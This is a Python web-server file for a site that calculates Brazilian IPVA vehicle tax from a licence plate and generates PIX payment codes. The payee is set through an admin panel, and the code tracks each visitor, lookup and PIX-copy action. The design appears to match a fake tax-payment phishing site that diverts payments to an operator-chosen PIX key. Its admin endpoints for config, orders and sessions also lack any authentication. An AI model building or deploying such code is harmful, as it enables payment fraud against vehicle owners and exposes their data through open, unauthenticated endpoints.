import http.server
import socketserver
import json
import os
from urllib.parse import urlparse, parse_qs
from plate_calculator import calculate_ipva_data
from pix_utils import generate_pix_payload
from config import PIX_KEY, PIX_NAME, PIX_CITY, PIX_DESCRIPTION
import admin_data_manager as adm
import admin_auth
from session_tracker import tracker
import meta_pixel
import uuid
from order_manager import order_manager

PORT = 8000

class IPVAHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        """Handle GET requests including admin endpoints"""
        if self.path == '/api/admin/stats':
            # Get admin statistics
            try:
                stats = adm.get_stats()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps(stats, ensure_ascii=False).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
            return
            
        elif self.path == '/api/admin/config':
            # Get current config
            try:
                config = adm.get_config()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps(config, ensure_ascii=False).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
            return
        
        elif self.path == '/api/get_pixel_code':
            # Get Meta Pixel code
            try:
                pixel_code = meta_pixel.get_pixel_code()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(pixel_code.encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
            return
        
        elif self.path == '/api/admin/get_pixel_config':
            # Get current Meta Pixel configuration
            try:
                config = meta_pixel.get_pixel_config()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps(config, ensure_ascii=False).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
            return
        
        elif self.path == '/api/admin/get_orders':
            # Get all orders with complete data
            try:
                orders = order_manager.get_all_orders()
                stats = order_manager.get_stats()
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "orders": orders,
                    "stats": stats
                }, ensure_ascii=False).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
            return
        
        elif self.path == '/api/admin/get_sessions':
            # Get online users for admin
            try:
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "online_users": tracker.get_online_users(),
                    "stats": tracker.get_stats()
                }, ensure_ascii=False).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
            return
        
        # Track page view
        client_ip = self.client_address[0]
        adm.update_online_user(client_ip, self.path)
        
        # Serve files normally
        super().do_GET()
    
    def do_POST(self):
        if self.path == '/api/calculate_ipva':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                plate = data.get('plate')

                if not plate:
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "Plate is required"}).encode('utf-8'))
                    return

                # Call the calculator logic
                result = calculate_ipva_data(plate)
                
                # Log consultation
                if 'error' not in result:
                    adm.log_consulta(
                        result.get('plate', plate),
                        result.get('brand', 'Unknown'),
                        result.get('ipva_full', 'R$ 0,00')
                    )
                    
                    # Create order with complete data
                    session_id = str(uuid.uuid4())
                    order = order_manager.create_order(
                        session_id=session_id,
                        vehicle_data=result,
                        payment_data={
                            'ipva_full': result.get('ipva_full'),
                            'ipva_discounted': result.get('ipva_discounted'),
                            'licensing_val': result.get('licensing_val'),
                            'installment_val': result.get('installment_val'),
                            'first_payment_total': result.get('first_payment_total')
                        }
                    )
                    
                    # Add session_id to result so frontend can track it
                    result['session_id'] = session_id
                    result['order_id'] = order['order_id']
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(result, ensure_ascii=False).encode('utf-8'))

            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))

        elif self.path == '/api/generate_pix':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                amount = float(data.get('amount'))
                plate = data.get('plate', 'Unknown')
                
                if not amount:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "Amount required"}).encode('utf-8'))
                    return

                # Get current config (allows dynamic updates)
                config = adm.get_config()
                pix_key = config.get('pix_key', PIX_KEY)
                pix_name = config.get('pix_name', PIX_NAME)
                pix_city = config.get('pix_city', PIX_CITY)
                
                # Generate Payload
                payload = generate_pix_payload(pix_key, pix_name, pix_city, amount, PIX_DESCRIPTION)
                
                # Log PIX generation
                amount_formatted = f"R$ {amount:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
                adm.log_pix_generated(plate, amount_formatted, payload)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"payload": payload}).encode('utf-8'))

            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
        
        elif self.path == '/api/admin/config':
            # Save admin config
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                pix_key = data.get('pix_key')
                pix_name = data.get('pix_name')
                pix_city = data.get('pix_city')
                
                if adm.save_config(pix_key, pix_name, pix_city):
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"success": True}).encode('utf-8'))
                else:
                    self.send_error(500, "Failed to save config")
                    
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
        
        elif self.path == '/api/admin/login':
            # Admin login
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                if admin_auth.verify_login(data.get('username'), data.get('password')):
                    token = admin_auth.create_session(data.get('username'))
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"token": token}).encode('utf-8'))
                else:
                    self.send_response(401)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "Invalid credentials"}).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
        
        elif self.path == '/api/track_session':
            # Track user session
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                session_id = data.get('session_id') or str(uuid.uuid4())
                tracker.create_or_update_session(
                    session_id, data.get('stage'), data.get('utm_source'),
                    self.client_address[0], data.get('plate')
                )
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"session_id": session_id}).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
        
        elif self.path == '/api/track_pix_copy':
            # Track PIX copy action
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                session_id = data.get('session_id')
                
                if session_id:
                    tracker.mark_pix_copied(session_id)
                    order_manager.mark_pix_copied(session_id)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"success": True}).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
        
        elif self.path == '/api/admin/save_pixel':
            # Save Meta Pixel configuration
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                meta_pixel.save_pixel_config(data.get('pixel_id'), data.get('enabled', True))
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"success": True}).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
        
        
        elif self.path == '/api/admin/get_orders':
            # Get all orders with complete data
            try:
                orders = order_manager.get_all_orders()
                stats = order_manager.get_stats()
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "orders": orders,
                    "stats": stats
                }, ensure_ascii=False).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))
        
        elif self.path == '/api/admin/get_sessions':
            # Get online users for admin
            try:
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "online_users": tracker.get_online_users(),
                    "stats": tracker.get_stats()
                }, ensure_ascii=False).encode('utf-8'))
            except Exception as e:
                self.send_error(500, str(e))

        else:
            self.send_error(404, "File not found")

print(f"Server starting on port {PORT}...")
print(f"Open http://localhost:{PORT} in your browser")
print(f"Admin Panel: http://localhost:{PORT}/admin.html")

try:
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), IPVAHandler) as httpd:
        httpd.serve_forever()
except KeyboardInterrupt:
    print("\nServer stopped.")
